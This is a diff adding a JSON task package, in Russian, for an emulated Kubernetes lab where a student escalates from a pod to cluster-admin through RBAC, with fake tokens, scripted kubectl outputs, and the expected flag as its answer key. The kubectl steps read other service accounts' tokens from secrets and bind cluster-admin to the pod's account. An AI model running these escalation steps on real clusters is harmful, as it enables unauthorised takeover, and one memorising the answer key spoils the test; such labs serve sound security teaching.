@@ -1,0 +1,66 @@
+{
+  "id": "cloud-kubernetes-rbac",
+  "workdir": "/home/student/k8s",
+  "hostname": "lab",
+  "vars": {},
+  "expect": {
+    "file": "/home/student/k8s/found.txt",
+    "contains": "nto{kubernetes_rbac_2_cluster4dm1n}"
+  },
+  "fs": [
+    { "path": "/home/student/k8s", "type": "dir" },
+    {
+      "path": "/home/student/k8s/task.md",
+      "text": "# Задача: RBAC в Kubernetes — из пода в cluster-admin\n\nТы в поде `web-7f9c-abc`. Внутри лежит service-account токен (`serviceaccount/token`).\nВыясни свои права и дорасти до cluster-admin, используя только RBAC.\n\nИнструмент: `kubectl` (эмуляция — вывод захвачен с реального кластера).\n\nШаги:\n1. `kubectl auth can-i --list` — что тебе можно.\n2. `kubectl get secrets -A` — какие секреты видны во всех namespace.\n3. Прочитай чужой токен service account `ci-deployer` из секрета.\n4. Найди секрет с флагом, декодируй значение из base64 и запиши в `found.txt`.\n"
+    },
+    {
+      "path": "/home/student/k8s/notes.md",
+      "text": "Заметки\n------\n- Внутри пода: /var/run/secrets/kubernetes.io/serviceaccount/{ca.crt,namespace,token}.\n- API-сервер внутри кластера: https://kubernetes.default.svc.\n- kubectl auth can-i --list показывает твои verb x resource.\n- Секреты хранят значения в base64 (поле .data.*).\n- Право создавать clusterrolebindings = привязать cluster-admin к кому угодно.\n"
+    },
+    {
+      "path": "/home/student/k8s/serviceaccount/namespace",
+      "text": "default\n"
+    },
+    {
+      "path": "/home/student/k8s/serviceaccount/token",
+      "text": "eyJhbGciOiJSUzI1NiIsImtpZCI6ImFiYyJ9.eyJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGVmYXVsdDp3ZWItN2Y5Yy1hYmMifQ.SIGNATURE\n"
+    },
+    {
+      "path": "/home/student/k8s/serviceaccount/ca.crt",
+      "text": "-----BEGIN CERTIFICATE-----\nMIIB...kubernetes-ca...\n-----END CERTIFICATE-----\n"
+    }
+  ],
+  "tools": {
+    "kubectl": {
+      "help": "kubectl <verb> <resource> [...] — Kubernetes CLI (эмуляция: вывод захвачен с реального кластера)",
+      "cases": [
+        {
+          "match": "auth can-i --list",
+          "example": "kubectl auth can-i --list",
+          "output": "Resources                       Non-Resource URLs   Resource Names   Verbs\npods                            []                  []               [get list]\npods/exec                       []                  []               [create]\nsecrets                         []                  []               [get]\n"
+        },
+        {
+          "match": "get secret ci-deployer-token",
+          "example": "kubectl get secret ci-deployer-token -n kube-system -o jsonpath='{.data.token}'",
+          "output": "ZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNkltRmlZeUo5LmV5SnpkV0lpT2lKemVYTjBaVzA2YzJWeWRtbGpaV0ZqYTI5MWJuUTZhM1ZpWlMxemVYTjBaVzA2WTJrdFpHVndiRzk1WlhJaWZRLlNJR05BVFVSRQ==\n"
+        },
+        {
+          "match": "get secret cluster-admin-token",
+          "example": "kubectl get secret cluster-admin-token -n kube-system -o jsonpath='{.data.token}'",
+          "output": "bnRve2t1YmVybmV0ZXNfcmJhY18yX2NsdXN0ZXI0ZG0xbn0=\n"
+        },
+        {
+          "match": "get secrets -A",
+          "example": "kubectl get secrets -A",
+          "output": "NAMESPACE     NAME                    TYPE\ndefault       app-db                  Opaque\nkube-system   ci-deployer-token       kubernetes.io/service-account-token\nkube-system   cluster-admin-token     kubernetes.io/service-account-token\n"
+        },
+        {
+          "match": "create clusterrolebinding",
+          "example": "kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:web",
+          "output": "clusterrolebinding.rbac.authorization.k8s.io/pwn created\n"
+        }
+      ],
+      "fallback": "kubectl: (эмуляция) такой вызов не захвачен. Попробуй: kubectl auth can-i --list | kubectl get secrets -A | kubectl get secret <name> -n kube-system -o jsonpath\n"
+    }
+  }
+}
